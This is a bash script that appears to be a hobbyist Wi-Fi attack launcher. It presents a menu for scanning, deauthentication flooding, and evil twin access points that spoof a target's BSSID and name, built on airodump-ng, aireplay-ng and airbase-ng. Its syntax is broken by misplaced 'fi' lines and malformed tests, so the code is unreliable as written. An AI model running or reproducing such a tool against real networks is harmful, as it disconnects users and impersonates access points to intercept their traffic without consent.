#! /bin/bash

echo "
                                                                               
                            @@@@@@@@@@@@@@@@@@@@@@@@@                           
                      @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(                     
                  @@@@@@@@@@@/                     @@@@@@@@@@@                  
               @@@@@@@@@                                 @@@@@@@@#              
               @@@@@@          @@@@@@@@@@@@@@@@@@@          @@@@@@              
                          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@                         
                       @@@@@@@@@@               @@@@@@@@@@                      
                       @@@@@                         @@@@@                      
                                   @@@@@@@@@@@                                  
                              @@@@@@@@@@@@@@@@@@@@@                             
                              @@@@@@        ,@@@@@@                             
                                                                                
                                                                                
                                     @@@@@@@                                    
                                    @@@@@@@@@                                   
                                     @@@@@@@                                    
                                                                                
                                                                                
                                                                                
                                                                                "

echo "This is the section for Wifi-related attacks, First off enter your wireless interface, ex:*wlan0*"
read INTER
sleep 1
echo "Choose an attack"
echo "/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/"
echo "-------------------------------"
echo "Simple Wifi scan(1)"
echo "-------------------------------"
echo "Evil Twin attack(2)"
echo "-------------------------------"
echo "Deauth attack(3)"
echo "-------------------------------"
echo "Deauth attack+Capture handshake(4)"
echo "-------------------------------"
echo "Deauth attack+Evil Twin(5)"
echo "-------------------------------"
read ATTACKTY

if [[ $ATTACKTY == '1' ]]
then
    sudo airodump-ng $INTER

elif [[ $ATTACKTY == '2' ]]
then
    echo "A scan will be intiated, press CTRL+C to stop it once you found the target"
    sleep 3
    sudo airodump-ng $INTER
    echo "Enter target's BSSID"
    echo "Enter Evil Twin's Name"
    read BSSID
    read NAMEW
    sudo airbase-ng -a $BSSID  -e $NAMEW -c 6 wlan0
fi
    

elif [[ $ATTACKTY == '3']]
then
    echo "This will launch a Deauthentication attack which will kick users out of a wifi network"
    sleep 1
    echo "A scan will be intiated, press CTRL+C to stop it once you found the target"
    sudo airodump-ng $INTER
    echo "Enter target's BSSID"
    read BSSID3
    sudo aireplay-ng --deauth 1000 -a $BSSID3 $INTER
fi
elif [[ $ATTACKTY == '4']]
then  
    echo "This is still under construction, sorry!"
fi
elif [[ $ATTACKTY == '5']]
then
    echo "This will launch a Deauth attack, then create an Evil Twin of a wifi"
    echo "A scan will be intiated, press CTRL+C to stop it once you found the target"
    sleep 2
    sudo airodump-ng $INTER
    echo "Enter target's BSSID"
    echo "Enter Evil twin's wifi name(highly recommend using the real wifi name)"
    read BSSID5
    read EVNAME
    sudo aireplay-ng --deauth 1000 -a $BSSID5 $INTER
    sleep 1
    sudo 
    sudo airbase-ng -a $BSSID5  -e $EVNAME -c 6 $INTER
fi






else
    echo "bruh"

fi

